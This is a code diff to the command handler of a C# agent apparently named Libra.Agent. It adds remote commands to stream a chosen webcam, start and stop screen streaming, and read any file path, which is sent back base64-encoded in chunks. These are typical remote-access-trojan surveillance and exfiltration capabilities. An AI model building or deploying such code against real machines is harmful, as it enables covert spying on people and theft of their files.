@@ -114,13 +114,14 @@ namespace Libra.Agent.Handle
 
                 case CommandType.GetCameraFrame:
 
+                    int camIdx = Packet.Parameter.Length > 0
+                        && int.TryParse(Packet.Parameter[0], out int ci) ? ci : 0;
+
                     var cameraBytes = MonitorHelper.CaptureCameraFrame(
-                        cameraIndex: 0,
-                        width: 1280,
-                        height: 720,
+                        cameraIndex: camIdx,
                         jpegQuality: 60);
 
-                    if (cameraBytes == null)
+                    if (cameraBytes == null || cameraBytes.Length == 0)
                     {
                         //D Console.WriteLine("摄像头采集失败");
                         break;
@@ -138,6 +139,20 @@ namespace Libra.Agent.Handle
                     //D Console.WriteLine($"执行结果: 帧大小 {cameraBytes.Length}Byte,{sendcameraResult}");
                     break;
 
+                case CommandType.StartCameraStream:
+                    int startCamIdx = Packet.Parameter.Length > 0
+                        && int.TryParse(Packet.Parameter[0], out int sc) ? sc : 0;
+                    int startFps = Packet.Parameter.Length > 1
+                        && int.TryParse(Packet.Parameter[1], out int sf) ? sf : 10;
+                    CameraStreamer.Start(startCamIdx, Packet.TaskId, startFps);
+                    break;
+
+                case CommandType.StopCameraStream:
+                    int stopCamIdx = Packet.Parameter.Length > 0
+                        && int.TryParse(Packet.Parameter[0], out int stc) ? stc : 0;
+                    CameraStreamer.Stop(stopCamIdx);
+                    break;
+
                 case CommandType.StartScreenStream:
                     var quality = Packet.Parameter.Length > 0 ? Packet.Parameter[0] : "720p";
                     await ScreenStreamer.StartAsync(Packet.TaskId, quality: quality);
@@ -145,6 +160,10 @@ namespace Libra.Agent.Handle
 
                 case CommandType.StopScreenStream:
                     ScreenStreamer.Stop();
+                    break;
+
+                case CommandType.ReadFileStream:
+                    await ReadFileStreamAsync(Packet.TaskId, Packet.Parameter[0]);
                     break;
 
                 default:
@@ -174,6 +193,56 @@ namespace Libra.Agent.Handle
             await process.WaitForExitAsync();
 
             return output + error;
+        }
+
+        private const int ChunkSize = 512 * 1024; // 512KB per chunk
+
+        private static async Task ReadFileStreamAsync(Guid taskId, string filepath)
+        {
+            if (!File.Exists(filepath))
+            {
+                // Send empty result to signal file not found
+                await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult
+                {
+                    TaskId = taskId,
+                    Result = "",
+                    EndTime = DateTime.Now
+                });
+                return;
+            }
+
+            try
+            {
+                using var fs = new FileStream(filepath, FileMode.Open, FileAccess.Read, FileShare.Read);
+                var buffer = new byte[ChunkSize];
+                int bytesRead;
+
+                while ((bytesRead = await fs.ReadAsync(buffer.AsMemory(0, ChunkSize))) > 0)
+                {
+                    var chunk = bytesRead == ChunkSize
+                        ? buffer
+                        : buffer.AsSpan(0, bytesRead).ToArray();
+
+                    await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult
+                    {
+                        TaskId = taskId,
+                        Result = Convert.ToBase64String(chunk),
+                        EndTime = DateTime.Now
+                    });
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"ReadFileStream error: {ex.Message}");
+            }
+
+            // EOF marker: empty result
+            await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult
+            {
+                TaskId = taskId,
+                Result = "",
+                EndTime = DateTime.Now
+            });
         }
     }
 }
